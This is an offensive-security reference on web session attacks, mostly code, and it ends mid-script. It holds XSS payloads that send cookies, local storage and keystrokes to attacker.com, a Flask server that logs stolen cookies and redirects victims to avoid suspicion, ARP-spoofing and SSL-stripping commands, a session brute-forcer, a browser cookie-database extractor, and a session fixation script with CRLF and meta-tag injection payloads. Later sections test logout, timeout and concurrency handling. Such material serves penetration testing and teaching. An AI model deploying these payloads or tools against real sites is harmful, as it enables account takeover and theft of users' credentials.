# Session Attacks

## Table of Contents
1. [Session Hijacking](#1-session-hijacking)
2. [Session Fixation](#2-session-fixation)
3. [Session Management Flaws](#3-session-management-flaws)
4. [Cookie Attacks](#4-cookie-attacks)

---

## 1. Session Hijacking

Session hijacking involves stealing or taking over a legitimate user's session to gain unauthorized access to their account.

### 1.1 XSS-Based Session Theft

Cross-Site Scripting (XSS) is one of the most common methods for stealing session cookies.

#### Vulnerable Code Example
```php
<!-- VULNERABLE: Reflected XSS -->
<?php
$search = $_GET['q'];
echo "Search results for: " . $search;  // No sanitization!
?>

<!-- VULNERABLE: Stored XSS in comments -->
<?php
$comment = $_POST['comment'];
$stmt = $pdo->prepare("INSERT INTO comments (content) VALUES (?)");
$stmt->execute([$comment]);  // Stored without sanitization

// Later displayed without encoding
foreach ($comments as $comment) {
    echo "<p>" . $comment['content'] . "</p>";  // XSS!
}
?>
```

#### XSS Cookie Stealing Payloads
```javascript
// Basic cookie stealer
<script>
document.location='http://attacker.com/steal?c='+document.cookie;
</script>

// Using Image object (stealthier)
<script>
new Image().src='http://attacker.com/steal?c='+document.cookie;
</script>

// Fetch API
<script>
fetch('http://attacker.com/steal?c='+document.cookie);
</script>

// XMLHttpRequest
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com/steal?c='+encodeURIComponent(document.cookie));
xhr.send();
</script>

// WebSocket exfiltration
<script>
var ws = new WebSocket('wss://attacker.com/ws');
ws.onopen = function() { ws.send(document.cookie); };
</script>

// Using SVG
<svg onload="fetch('http://attacker.com/steal?c='+document.cookie)">

// Using IMG error handler
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">

// Bypassing HttpOnly with TRACE (if enabled)
<script>
var xhr = new XMLHttpRequest();
xhr.open('TRACE', '/', true);
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
        // Cookie appears in response with TRACE
        fetch('http://attacker.com/steal?data='+btoa(xhr.responseText));
    }
};
xhr.send();
</script>

// Keylogger to capture session-related input
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key='+e.key);
};
</script>

// Stealing localStorage/sessionStorage (may contain tokens)
<script>
var data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
};
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
});
</script>
```

#### Cookie Stealer Server
```python
from flask import Flask, request, redirect
import logging

app = Flask(__name__)
logging.basicConfig(filename='stolen_cookies.log', level=logging.INFO)

@app.route('/steal')
def steal():
    cookie = request.args.get('c', '')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    referer = request.headers.get('Referer', '')

    logging.info(f"""
    === Stolen Cookie ===
    Cookie: {cookie}
    IP: {ip}
    UA: {user_agent}
    Referer: {referer}
    =====================
    """)

    # Redirect to legitimate page to avoid suspicion
    return redirect('https://target.com/')

@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()
    logging.info(f"Collected data: {data}")
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, ssl_context='adhoc')
```

### 1.2 Man-in-the-Middle (MITM) Session Theft

Intercepting session tokens in transit.

#### ARP Spoofing Setup
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoof (using arpspoof from dsniff)
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP

# Or using Ettercap
ettercap -T -q -i eth0 -M arp:remote /VICTIM_IP// /GATEWAY_IP//
```

#### Capturing Sessions with Wireshark
```
# Capture filters
tcp port 80 or tcp port 443

# Display filters for cookies
http.cookie contains "session"
http.cookie contains "PHPSESSID"
http.cookie contains "JSESSIONID"
http.set_cookie contains "session"

# Extract cookies with tshark
tshark -i eth0 -Y 'http.cookie' -T fields -e http.cookie
```

#### mitmproxy Session Capture
```python
from mitmproxy import http
import json

class SessionCapture:
    def __init__(self):
        self.sessions = []

    def request(self, flow: http.HTTPFlow):
        cookies = flow.request.cookies

        if cookies:
            session_info = {
                'url': flow.request.url,
                'cookies': dict(cookies),
                'headers': dict(flow.request.headers)
            }
            self.sessions.append(session_info)
            print(f"[+] Captured session: {json.dumps(session_info, indent=2)}")

    def response(self, flow: http.HTTPFlow):
        set_cookies = flow.response.headers.get_all('Set-Cookie')

        for cookie in set_cookies:
            print(f"[+] New cookie set: {cookie}")

addons = [SessionCapture()]

# Run: mitmproxy -s session_capture.py
```

#### SSL Stripping (SSLstrip)
```bash
# Setup iptables
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Run sslstrip
sslstrip -l 8080 -w sslstrip.log

# Modern alternative: mitmproxy with ssl_insecure
mitmproxy --ssl-insecure --mode transparent

# Bettercap for comprehensive MITM
bettercap -iface eth0 -eval "set arp.spoof.targets VICTIM_IP; arp.spoof on; set net.sniff.local true; net.sniff on"
```

### 1.3 Session Token Prediction

Predicting or guessing session tokens with weak entropy.

#### Vulnerable Session Generation
```python
import time
import random
import hashlib

# VULNERABLE: Predictable session ID
def generate_session_id_weak():
    # Using timestamp - predictable!
    timestamp = str(int(time.time()))
    return hashlib.md5(timestamp.encode()).hexdigest()

# VULNERABLE: Weak random seed
def generate_session_id_weak_random():
    random.seed(time.time())  # Predictable seed!
    chars = 'abcdef0123456789'
    return ''.join(random.choice(chars) for _ in range(32))

# VULNERABLE: Sequential session IDs
session_counter = 0
def generate_session_id_sequential():
    global session_counter
    session_counter += 1
    return f"SESSION{session_counter:08d}"

# VULNERABLE: User-based predictable session
def generate_session_id_user_based(user_id, timestamp):
    # Attacker knowing user_id and approximate time can predict
    return hashlib.sha1(f"{user_id}{timestamp}".encode()).hexdigest()
```

#### Session Prediction Analysis
```python
import requests
import hashlib
import time
from collections import Counter

class SessionAnalyzer:
    def __init__(self, target_url, session_cookie_name='PHPSESSID'):
        self.target_url = target_url
        self.cookie_name = session_cookie_name
        self.sessions = []

    def collect_sessions(self, count=100):
        """Collect multiple session IDs for analysis"""
        for i in range(count):
            session = requests.Session()
            response = session.get(self.target_url)

            session_id = session.cookies.get(self.cookie_name)
            if session_id:
                self.sessions.append(session_id)
                print(f"Collected: {session_id}")

            time.sleep(0.1)

        return self.sessions

    def analyze_patterns(self):
        """Analyze session ID patterns"""
        if not self.sessions:
            print("No sessions collected")
            return

        print(f"\n=== Session Analysis ===")
        print(f"Total sessions: {len(self.sessions)}")
        print(f"Unique sessions: {len(set(self.sessions))}")

        # Length analysis
        lengths = [len(s) for s in self.sessions]
        print(f"\nLength: min={min(lengths)}, max={max(lengths)}")

        # Character set analysis
        all_chars = ''.join(self.sessions)
        char_freq = Counter(all_chars)
        print(f"\nCharacter set: {sorted(set(all_chars))}")
        print(f"Most common chars: {char_freq.most_common(10)}")

        # Sequential analysis
        if len(self.sessions) >= 2:
            # Check if sessions are sequential numbers
            try:
                nums = [int(s, 16) for s in self.sessions]
                diffs = [nums[i+1] - nums[i] for i in range(len(nums)-1)]

                if len(set(diffs)) == 1:
                    print(f"\n[!] SEQUENTIAL PATTERN DETECTED! Increment: {diffs[0]}")
                elif max(diffs) - min(diffs) < 100:
                    print(f"\n[!] Near-sequential pattern. Diffs range: {min(diffs)}-{max(diffs)}")

            except ValueError:
                pass

        # Entropy estimation
        entropy = self.estimate_entropy(self.sessions[0])
        print(f"\nEstimated entropy: {entropy:.2f} bits")

        if entropy < 64:
            print("[!] LOW ENTROPY - Sessions may be predictable!")
        elif entropy < 128:
            print("[*] MODERATE ENTROPY")
        else:
            print("[+] HIGH ENTROPY")

    def estimate_entropy(self, session_id):
        """Estimate entropy of session ID"""
        charset_size = len(set(session_id))
        length = len(session_id)

        # Simple entropy estimate
        import math
        return length * math.log2(charset_size) if charset_size > 0 else 0

    def predict_next(self, known_session):
        """Attempt to predict next session ID"""
        predictions = []

        # Try increment
        try:
            num = int(known_session, 16)
            predictions.append(format(num + 1, 'x').zfill(len(known_session)))
        except ValueError:
            pass

        # Try timestamp-based
        for offset in range(-60, 61):
            timestamp = int(time.time()) + offset
            predictions.append(hashlib.md5(str(timestamp).encode()).hexdigest())
            predictions.append(hashlib.sha1(str(timestamp).encode()).hexdigest()[:len(known_session)])

        return predictions

# Usage
analyzer = SessionAnalyzer("https://target.com/")
analyzer.collect_sessions(50)
analyzer.analyze_patterns()
```

### 1.4 Session Brute Forcing

Brute forcing weak session tokens.

#### Session Brute Force Script
```python
import requests
import string
import itertools
from concurrent.futures import ThreadPoolExecutor

class SessionBruteForcer:
    def __init__(self, target_url, session_cookie_name='session'):
        self.target_url = target_url
        self.cookie_name = session_cookie_name
        self.found = False

    def test_session(self, session_id):
        if self.found:
            return None

        cookies = {self.cookie_name: session_id}

        try:
            response = requests.get(
                self.target_url,
                cookies=cookies,
                timeout=10,
                allow_redirects=False
            )

            # Check for valid session indicators
            if self.is_valid_session(response):
                print(f"[+] Valid session found: {session_id}")
                self.found = True
                return session_id

        except:
            pass

        return None

    def is_valid_session(self, response):
        # Customize based on target application
        if response.status_code == 200:
            if 'logout' in response.text.lower():
                return True
            if 'dashboard' in response.text.lower():
                return True
            if 'welcome' in response.text.lower():
                return True
        if response.status_code == 302:
            location = response.headers.get('Location', '')
            if 'dashboard' in location or 'home' in location:
                return True
        return False

    def brute_force_numeric(self, length, threads=20):
        """Brute force numeric session IDs"""
        charset = string.digits

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for combo in itertools.product(charset, repeat=length):
                if self.found:
                    break
                session_id = ''.join(combo)
                executor.submit(self.test_session, session_id)

    def brute_force_range(self, start, end, prefix='', suffix=''):
        """Brute force sequential range"""
        for i in range(start, end + 1):
            if self.found:
                break
            session_id = f"{prefix}{i}{suffix}"
            self.test_session(session_id)

    def brute_force_hex(self, length, threads=20):
        """Brute force hexadecimal session IDs"""
        charset = string.hexdigits[:16]  # 0-9, a-f

        count = 0
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for combo in itertools.product(charset, repeat=length):
                if self.found or count > 1000000:  # Limit attempts
                    break
                session_id = ''.join(combo)
                executor.submit(self.test_session, session_id)
                count += 1

# Usage
bruter = SessionBruteForcer("https://target.com/dashboard")
bruter.brute_force_range(1000, 9999, prefix="SESSION_")
```

### 1.5 Cookie Theft via Physical/Browser Access

Techniques for extracting cookies from browser storage.

#### Browser Cookie Extraction
```python
import sqlite3
import os
import json
from Crypto.Cipher import AES
import base64

class BrowserCookieExtractor:
    """Extract cookies from local browser databases"""

    def get_chrome_cookies(self, profile_path=None):
        """Extract cookies from Chrome"""
        if not profile_path:
            profile_path = os.path.expanduser(
                '~/.config/google-chrome/Default/Cookies'
            )

        cookies = []

        try:
            conn = sqlite3.connect(profile_path)
            cursor = conn.cursor()

            cursor.execute("""
                SELECT host_key, name, value, encrypted_value, path, expires_utc
                FROM cookies
            """)

            for row in cursor.fetchall():
                cookies.append({
                    'domain': row[0],
                    'name': row[1],
                    'value': row[2] or self.decrypt_chrome_cookie(row[3]),
                    'path': row[4],
                    'expires': row[5]
                })

            conn.close()

        except Exception as e:
            print(f"Error extracting Chrome cookies: {e}")

        return cookies

    def get_firefox_cookies(self, profile_path=None):
        """Extract cookies from Firefox"""
        if not profile_path:
            # Find Firefox profile
            firefox_dir = os.path.expanduser('~/.mozilla/firefox/')
            profiles = [d for d in os.listdir(firefox_dir) if d.endswith('.default')]
            if profiles:
                profile_path = os.path.join(firefox_dir, profiles[0], 'cookies.sqlite')

        cookies = []

        try:
            conn = sqlite3.connect(profile_path)
            cursor = conn.cursor()

            cursor.execute("""
                SELECT host, name, value, path, expiry
                FROM moz_cookies
            """)

            for row in cursor.fetchall():
                cookies.append({
                    'domain': row[0],
                    'name': row[1],
                    'value': row[2],
                    'path': row[3],
                    'expires': row[4]
                })

            conn.close()

        except Exception as e:
            print(f"Error extracting Firefox cookies: {e}")

        return cookies

    def filter_session_cookies(self, cookies, domains=None):
        """Filter cookies to find session-related ones"""
        session_names = [
            'session', 'sessionid', 'phpsessid', 'jsessionid',
            'aspsessionid', 'sid', 'ssid', 'auth', 'token',
            'jwt', 'access_token', 'refresh_token', 'csrf'
        ]

        filtered = []
        for cookie in cookies:
            name_lower = cookie['name'].lower()
            if any(sn in name_lower for sn in session_names):
                if domains is None or any(d in cookie['domain'] for d in domains):
                    filtered.append(cookie)

        return filtered

# Command line extraction (Linux)
extraction_commands = """
# Chrome cookies location
~/.config/google-chrome/Default/Cookies

# Firefox cookies location
~/.mozilla/firefox/*.default/cookies.sqlite

# Extract with sqlite3
sqlite3 ~/.config/google-chrome/Default/Cookies "SELECT * FROM cookies WHERE host_key LIKE '%target.com%'"

# Copy cookie database (might need to close browser first)
cp ~/.config/google-chrome/Default/Cookies /tmp/cookies_copy
sqlite3 /tmp/cookies_copy ".dump cookies"
"""
```

---

## 2. Session Fixation

Session fixation attacks force a victim to use an attacker-controlled session ID.

### 2.1 Pre-Authentication Session Fixation

Setting a session ID before the victim authenticates.

#### Vulnerable Code Example
```php
<?php
// VULNERABLE: Session ID accepted from URL/cookie before auth
session_start();

// No session regeneration after login!
if (isset($_POST['username']) && isset($_POST['password'])) {
    if (authenticate($_POST['username'], $_POST['password'])) {
        $_SESSION['user'] = $_POST['username'];
        $_SESSION['logged_in'] = true;
        // Session ID remains the same - VULNERABLE!
    }
}
?>
```

#### Session Fixation Attack Flow
```
1. Attacker obtains valid session ID from target site
   GET http://target.com/ → Set-Cookie: PHPSESSID=attacker_session_id

2. Attacker crafts URL with session ID
   http://target.com/login?PHPSESSID=attacker_session_id
   OR
   http://target.com/login (with Set-Cookie via XSS)

3. Victim clicks link and logs in
   - Victim authenticates with attacker's session ID
   - Session is now authenticated

4. Attacker uses same session ID to access victim's account
   GET http://target.com/dashboard
   Cookie: PHPSESSID=attacker_session_id
   → Access to victim's authenticated session!
```

#### Fixation Script
```python
import requests

class SessionFixationAttack:
    def __init__(self, target_url, login_url, cookie_name='PHPSESSID'):
        self.target_url = target_url
        self.login_url = login_url
        self.cookie_name = cookie_name

    def get_fixation_session(self):
        """Get a session ID to fixate"""
        session = requests.Session()
        response = session.get(self.target_url)

        session_id = session.cookies.get(self.cookie_name)
        print(f"[+] Obtained session ID: {session_id}")

        return session_id

    def generate_attack_vectors(self, session_id):
        """Generate various attack vectors"""
        vectors = []

        # URL parameter
        vectors.append({
            'type': 'URL Parameter',
            'payload': f"{self.login_url}?{self.cookie_name}={session_id}"
        })

        # URL path (for some servers)
        vectors.append({
            'type': 'URL Path',
            'payload': f"{self.login_url};{self.cookie_name}={session_id}"
        })

        # XSS payload to set cookie
        vectors.append({
            'type': 'XSS Cookie Set',
            'payload': f'<script>document.cookie="{self.cookie_name}={session_id}";</script>'
        })

        # Meta refresh with cookie
        vectors.append({
            'type': 'Meta Refresh',
            'payload': f'<meta http-equiv="Set-Cookie" content="{self.cookie_name}={session_id}">'
        })

        return vectors

    def check_if_session_authenticated(self, session_id):
        """Check if the fixated session is now authenticated"""
        session = requests.Session()
        session.cookies.set(self.cookie_name, session_id)

        response = session.get(f"{self.target_url}/dashboard")

        if response.status_code == 200:
            if 'dashboard' in response.text.lower() or 'welcome' in response.text.lower():
                print(f"[+] Session {session_id} is authenticated!")
                return True

        if 'login' not in response.url:
            print(f"[+] Session appears authenticated (no redirect to login)")
            return True

        print(f"[-] Session not authenticated yet")
        return False

    def wait_for_authentication(self, session_id, check_interval=5, max_checks=100):
        """Poll until session becomes authenticated"""
        import time

        print(f"[*] Waiting for victim to authenticate session: {session_id}")

        for i in range(max_checks):
            if self.check_if_session_authenticated(session_id):
                print(f"[+] SUCCESS! Session authenticated after {i * check_interval} seconds")
                return True
            time.sleep(check_interval)

        print("[-] Timeout waiting for authentication")
        return False

# Usage
attacker = SessionFixationAttack(
    "https://target.com",
    "https://target.com/login",
    "PHPSESSID"
)

session_id = attacker.get_fixation_session()
vectors = attacker.generate_attack_vectors(session_id)

for vector in vectors:
    print(f"\n{vector['type']}:")
    print(f"  {vector['payload']}")
```

### 2.2 Cookie Injection Fixation

Injecting session cookies via various methods.

#### Cookie Injection Techniques
```html
<!-- XSS Cookie Injection -->
<script>document.cookie="PHPSESSID=attacker_session; path=/; domain=.target.com";</script>

<!-- Meta tag injection (older browsers) -->
<meta http-equiv="Set-Cookie" content="PHPSESSID=attacker_session; path=/">

<!-- Subdomain cookie injection (if controlling subdomain) -->
<!-- From evil.target.com, set cookie for .target.com -->
<script>
document.cookie = "PHPSESSID=attacker_session; domain=.target.com; path=/";
</script>

<!-- Cookie jar overflow (force cookie replacement) -->
<script>
// Fill cookie jar to force rotation
for (var i = 0; i < 700; i++) {
    document.cookie = "cookie" + i + "=" + "x".repeat(4000) + "; path=/";
}
// Now set the session cookie
document.cookie = "PHPSESSID=attacker_session; path=/";
</script>
```

#### CRLF Injection for Cookie Setting
```http
# If header injection is possible
GET /page?param=value%0d%0aSet-Cookie:%20PHPSESSID=attacker_session HTTP/1.1
Host: target.com

# URL encoded CRLF
%0D%0ASet-Cookie:%20PHPSESSID=attacker_session
%0d%0aSet-Cookie:%20PHPSESSID=attacker_session

# Alternative encodings
%E5%98%8D%E5%98%8ASet-Cookie:%20PHPSESSID=attacker_session  # UTF-8 CRLF
```

### 2.3 Session Fixation via Meta Tag

Using HTML meta tags to set cookies.

#### Meta Tag Injection
```html
<!-- Classic meta tag cookie injection -->
<meta http-equiv="Set-Cookie" content="PHPSESSID=attacker_session">

<!-- With attributes -->
<meta http-equiv="Set-Cookie" content="PHPSESSID=attacker_session; path=/; expires=Thu, 01 Jan 2030 00:00:00 GMT">

<!-- Multiple cookies -->
<meta http-equiv="Set-Cookie" content="PHPSESSID=attacker_session">
<meta http-equiv="Set-Cookie" content="auth_token=malicious_token">

<!-- Combined with refresh -->
<meta http-equiv="Set-Cookie" content="PHPSESSID=attacker_session">
<meta http-equiv="refresh" content="0; url=https://target.com/login">
```

### 2.4 Session Fixation Testing Script
```python
import requests
from urllib.parse import urljoin

class SessionFixationTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.results = []

    def test_url_session_acceptance(self):
        """Test if session ID is accepted from URL"""
        test_session = "test_session_id_12345"

        params = [
            ('PHPSESSID', test_session),
            ('JSESSIONID', test_session),
            ('session', test_session),
            ('sid', test_session),
            ('sessionid', test_session),
        ]

        for param_name, param_value in params:
            url = f"{self.base_url}?{param_name}={param_value}"
            response = requests.get(url, allow_redirects=False)

            # Check if our session ID was accepted
            cookies = response.cookies
            set_cookie_header = response.headers.get('Set-Cookie', '')

            if param_value in set_cookie_header or cookies.get(param_name) == param_value:
                print(f"[+] Session fixation via URL parameter: {param_name}")
                self.results.append(('URL', param_name))

    def test_session_regeneration(self, login_url, credentials):
        """Test if session is regenerated after login"""
        session = requests.Session()

        # Get initial session
        response = session.get(self.base_url)
        initial_session = None

        for cookie in session.cookies:
            if 'session' in cookie.name.lower():
                initial_session = cookie.value
                break

        if not initial_session:
            print("[-] No session cookie found")
            return

        print(f"[*] Initial session: {initial_session}")

        # Login
        response = session.post(login_url, data=credentials)

        # Check post-login session
        post_login_session = None
        for cookie in session.cookies:
            if 'session' in cookie.name.lower():
                post_login_session = cookie.value
                break

        print(f"[*] Post-login session: {post_login_session}")

        if initial_session == post_login_session:
            print("[!] VULNERABLE: Session not regenerated after login!")
            self.results.append(('regeneration', 'failed'))
        else:
            print("[+] Session regenerated after login")
            self.results.append(('regeneration', 'passed'))

    def test_cross_subdomain_fixation(self, subdomains):
        """Test if cookies from subdomains affect main domain"""
        for subdomain in subdomains:
            session = requests.Session()

            # Try to set cookie from subdomain with domain=.target.com
            subdomain_url = f"https://{subdomain}"

            try:
                response = session.get(subdomain_url)
                # If subdomain sets a cookie for parent domain, that's fixation-vulnerable
                for cookie in session.cookies:
                    if cookie.domain.startswith('.'):
                        print(f"[!] Subdomain {subdomain} can set cookies for {cookie.domain}")
                        self.results.append(('subdomain', subdomain))
            except:
                pass

# Usage
tester = SessionFixationTester("https://target.com")
tester.test_url_session_acceptance()
tester.test_session_regeneration(
    "https://target.com/login",
    {"username": "test", "password": "test"}
)
```

---

## 3. Session Management Flaws

### 3.1 Missing Session Invalidation

Sessions not properly destroyed on logout or timeout.

#### Vulnerable Logout Implementation
```php
<?php
// VULNERABLE: Session data cleared but session not destroyed
function logout() {
    // Just unsets variables - session ID still valid!
    unset($_SESSION['user']);
    unset($_SESSION['logged_in']);

    // Should also do:
    // session_destroy();
    // session_regenerate_id(true);
    // Clear session cookie
}

// VULNERABLE: Client-side only logout
// JavaScript: localStorage.removeItem('token');
// Server session still valid!
?>
```

#### Testing Session Invalidation
```python
import requests

class SessionInvalidationTester:
    def __init__(self, base_url, login_url, logout_url):
        self.base_url = base_url
        self.login_url = login_url
        self.logout_url = logout_url

    def test_logout_invalidation(self, credentials):
        """Test if logout properly invalidates session"""
        session = requests.Session()

        # Login
        session.post(self.login_url, data=credentials)

        # Capture session cookie
        session_cookie = None
        for cookie in session.cookies:
            if 'session' in cookie.name.lower():
                session_cookie = (cookie.name, cookie.value)
                break

        if not session_cookie:
            print("[-] No session cookie found")
            return False

        print(f"[*] Session before logout: {session_cookie}")

        # Verify we're authenticated
        protected_page = session.get(f"{self.base_url}/dashboard")
        if 'login' in protected_page.url:
            print("[-] Not authenticated")
            return False

        # Logout
        session.get(self.logout_url)

        # Try to use old session
        new_session = requests.Session()
        new_session.cookies.set(session_cookie[0], session_cookie[1])

        response = new_session.get(f"{self.base_url}/dashboard")

        if 'login' not in response.url and 'dashboard' in response.text.lower():
            print("[!] VULNERABLE: Session still valid after logout!")
            return True
        else:
            print("[+] Session properly invalidated")
            return False

    def test_timeout_invalidation(self, credentials, wait_time=300):
        """Test if session times out properly"""
        import time

        session = requests.Session()

        # Login
        session.post(self.login_url, data=credentials)

        # Capture session
        session_cookie = None
        for cookie in session.cookies:
            if 'session' in cookie.name.lower():
                session_cookie = (cookie.name, cookie.value)
                break

        print(f"[*] Waiting {wait_time} seconds for session timeout...")
        time.sleep(wait_time)

        # Try to use session after timeout
        response = session.get(f"{self.base_url}/dashboard")

        if 'login' not in response.url:
            print(f"[!] Session still valid after {wait_time} seconds")
            return True
        else:
            print("[+] Session properly expired")
            return False

    def test_password_change_invalidation(self, credentials, new_password):
        """Test if sessions are invalidated after password change"""
        # Session 1
        session1 = requests.Session()
        session1.post(self.login_url, data=credentials)

        session1_cookie = None
        for cookie in session1.cookies:
            if 'session' in cookie.name.lower():
                session1_cookie = (cookie.name, cookie.value)
                break

        # Session 2 (simulating another device)
        session2 = requests.Session()
        session2.post(self.login_url, data=credentials)

        # Change password from session 1
        session1.post(
            f"{self.base_url}/change-password",
            data={'new_password': new_password, 'confirm_password': new_password}
        )

        # Check if session 2 is still valid
        response = session2.get(f"{self.base_url}/dashboard")

        if 'login' not in response.url:
            print("[!] Other sessions not invalidated after password change!")
            return True
        else:
            print("[+] Other sessions invalidated after password change")
            return False

# Usage
tester = SessionInvalidationTester(
    "https://target.com",
    "https://target.com/login",
    "https://target.com/logout"
)

tester.test_logout_invalidation({"username": "test", "password": "pass"})
```

### 3.2 Concurrent Session Issues

Handling of multiple simultaneous sessions.

#### Concurrent Session Testing
```python
import requests
from concurrent.futures import ThreadPoolExecutor
import time

class ConcurrentSessionTester:
    def __init__(self, base_url, login_url):
        self.base_url = base_url
        self.login_url = login_url

    def test_multiple_sessions(self, credentials, num_sessions=5):
        """Test if multiple concurrent sessions are allowed"""
        sessions = []

        for i in range(num_sessions):
            session = requests.Session()
            response = session.post(self.login_url, data=credentials)

            if response.status_code == 200 or response.status_code == 302:
                sessions.append(session)
                print(f"[+] Session {i+1} created")
            else:
                print(f"[-] Session {i+1} failed: {response.status_code}")

        # Check all sessions are still valid
        valid_count = 0
        for i, session in enumerate(sessions):
            response = session.get(f"{self.base_url}/dashboard")
            if 'login' not in response.url:
                valid_count += 1

        print(f"\n[*] {valid_count}/{num_sessions} sessions are valid")

        if valid_count == num_sessions:
            print("[!] Application allows unlimited concurrent sessions")
        elif valid_count == 1:
            print("[+] Application enforces single session")
        else:
            print(f"[*] Application allows {valid_count} concurrent sessions")

        return valid_count

    def test_new_session_invalidates_old(self, credentials):
        """Test if new login invalidates previous sessions"""
        # Create first session
        session1 = requests.Session()
        session1.post(self.login_url, data=credentials)

        # Verify first session works
        response1 = session1.get(f"{self.base_url}/dashboard")
        if 'login' in response1.url:
            print("[-] First session not authenticated")
            return False

        print("[*] First session authenticated")

        # Create second session (new login)
        session2 = requests.Session()
        session2.post(self.login_url, data=credentials)

        # Check if first session is still valid
        response1_after = session1.get(f"{self.base_url}/dashboard")

        if 'login' in response1_after.url:
            print("[+] New login invalidated previous session")
            return True
        else:
            print("[!] Previous session still valid after new login")
            return False

    def test_session_takeover_race(self, credentials):
        """Test race condition in session creation"""
        results = []

        def login_and_check(session_id):
            session = requests.Session()
            response = session.post(self.login_url, data=credentials)

            session_cookie = None
            for cookie in session.cookies:
                if 'session' in cookie.name.lower():
                    session_cookie = cookie.value
                    break

            results.append({
                'id': session_id,
                'session_cookie': session_cookie,
                'status': response.status_code
            })

        # Simultaneous login attempts
        with ThreadPoolExecutor(max_workers=10) as executor:
            for i in range(10):
                executor.submit(login_and_check, i)

        # Analyze results
        unique_sessions = set(r['session_cookie'] for r in results if r['session_cookie'])
        print(f"\n[*] {len(unique_sessions)} unique sessions from 10 simultaneous logins")

        return len(unique_sessions)

# Usage
tester = ConcurrentSessionTester(
    "https://target.com",
    "https://target.com/login"
)

tester.test_multiple_sessions({"username": "test", "password": "pass"})
tester.test_new_session_invalidates_old({"username": "test", "password": "pass"})
```

### 3.3 Session Timeout Issues

Improper handling of session timeouts.

#### Session Timeout Analysis
```python
import requests
import time

class SessionTimeoutTester:
    def __init__(self, base_url, login_url):
        self.base_url = base_url
        self.login_url = login_url

    def measure_session_timeout(self, credentials, max_wait=3600, check_interval=60):
        """Measure actual session timeout"""
        session = requests.Session()
        session.post(self.login_url, data=credentials)

        start_time = time.time()
        last_valid_time = start_time

        while (time.time() - start_time) < max_wait:
            time.sleep(check_interval)

            response = session.get(f"{self.base_url}/dashboard")

            if 'login' in response.url:
                timeout = time.time() - start_time
                print(f"[*] Session timed out after {timeout/60:.1f} minutes")
                return timeout
            else:
                last_valid_time = time.time()
                elapsed = time.time() - start_time
                print(f"[*] Session still valid after {elapsed/60:.1f} minutes")

        print(f"[!] Session still valid after {max_wait/60:.1f} minutes")
        return None

    def test_sliding_vs_absolute_timeout(self, credentials, activity_interval=30):
        """Determine if timeout is sliding (resets on activity) or absolute"""
        session = requests.Session()
        session.post(self.login_url, data=credentials)

        start_time = time.time()

        # Keep session active with periodic requests
        for i in range(60):  # Try for 30 minutes
            time.sleep(activity_interval)

            response = session.get(f"{self.base_url}/dashboard")

            if 'login' in response.url:
                timeout = time.time() - start_time
                print(f"[*] Absolute timeout: Session expired after {timeout/60:.1f} minutes despite activity")
                return 'absolute', timeout
            else:
                elapsed = time.time() - start_time
                print(f"[*] Still valid after {elapsed/60:.1f} minutes with activity")

        print("[*] No timeout detected with activity - likely sliding timeout")
        return 'sliding', None

    def test_idle_timeout(self, credentials, idle_periods=[60, 300, 600, 1800, 3600]):
        """Test various idle periods to find timeout threshold"""
        for idle_time in idle_periods:
            session = requests.Session()
            session.post(self.login_url, data=credentials)

            # Verify authenticated
            response = session.get(f"{self.base_url}/dashboard")
            if 'login' in response.url:
                print(f"[-] Initial auth failed")
                continue

            print(f"[*] Testing {idle_time/60:.1f} minute idle period...")
            time.sleep(idle_time)

            response = session.get(f"{self.base_url}/dashboard")

            if 'login' in response.url:
                print(f"[+] Session expired after {idle_time/60:.1f} minutes idle")
                return idle_time
            else:
                print(f"[*] Session still valid after {idle_time/60:.1f} minutes idle")

        print("[!] Session doesn't expire - no idle timeout detected")
        return None

# Usage
tester = SessionTimeoutTester(
    "https://target.com",
    "https://target.com/login"
)

tester.measure_session_timeout({"username": "test", "password": "pass"})
```

---

## 4. Cookie Attacks

### 4.1 Cookie Manipulation

Modifying cookie values to bypass security controls.

#### Vulnerable Cookie Implementation
```python
# VULNERABLE: Predictable/unprotected session data in cookie
from flask import Flask, request, make_response
import base64
import json

app = Flask(__name__)

@app.route('/set-user')
def set_user():
    user_data = {
        'user_id': 1,
        'username': 'user',
        'role': 'user'  # Attacker can change to 'admin'!
    }

    # VULNERABLE: No signature/encryption
    cookie_value = base64.b64encode(json.dumps(user_data).encode()).decode()

    response = make_response("Cookie set")
    response.set_cookie('user_session', cookie_value)
    return response

@app.route('/admin')
def admin():
    cookie = request.cookies.get('user_session')
    if cookie:
        user_data = json.loads(base64.b64decode(cookie))
        if user_data.get('role') == 'admin':
            return "Admin access granted!"  # Attacker wins!

    return "Access denied"
```

#### Cookie Manipulation Script
```python
import requests
import base64
import json
import re

class CookieManipulator:
    def __init__(self, target_url):
        self.target_url = target_url

    def decode_cookie(self, cookie_value):
        """Try various decoding methods"""
        decodings = []

        # Base64
        try:
            decoded = base64.b64decode(cookie_value).decode()
            decodings.append(('base64', decoded))
        except:
            pass

        # URL decode
        try:
            from urllib.parse import unquote
            decoded = unquote(cookie_value)
            decodings.append(('url', decoded))
        except:
            pass

        # Base64 + URL
        try:
            from urllib.parse import unquote
            decoded = base64.b64decode(unquote(cookie_value)).decode()
            decodings.append(('url+base64', decoded))
        except:
            pass

        # JSON parse attempts
        for name, decoded in decodings:
            try:
                parsed = json.loads(decoded)
                decodings.append((f'{name}+json', parsed))
            except:
                pass

        return decodings

    def encode_cookie(self, data, encoding='base64'):
        """Encode data for cookie"""
        if isinstance(data, dict):
            data = json.dumps(data)

        if encoding == 'base64':
            return base64.b64encode(data.encode()).decode()
        elif encoding == 'url':
            from urllib.parse import quote
            return quote(data)
